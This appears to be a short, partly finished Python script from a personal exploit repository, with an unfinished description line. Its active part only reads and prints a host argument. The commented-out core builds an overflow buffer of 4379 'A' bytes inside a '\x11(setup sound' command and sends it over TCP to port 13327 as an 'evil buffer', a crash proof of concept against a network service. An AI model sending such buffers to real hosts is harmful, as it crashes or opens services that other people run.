#!/usr/bin/python3

########################################################
# Author: 73ddy8342p1cn1c
# GitHub: https://github.com/73ddy8342p1cn1c/p1cn1c-845k37/main/pwn/FuzzyBear.py
# Date: 12/30/2020
# Version: 1.0
########################################################
# FuzzyBear automates the process of 
########################################################

import sys
import socket

def usage():
	print("breakVuln")

try:
	host = sys.argv[1]
except:
	usage()
print(host)

#crash = "\x41" * 4379
#buffer = "\x11(setup sound " + crash + "\x90\x00#"
#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#print("[*]Sending evil buffer...")
#s.connect((host, 13327))
#print(s.recv(1024))
#s.send(buffer)
#s.close()
#print("[*]Payload Sent !")
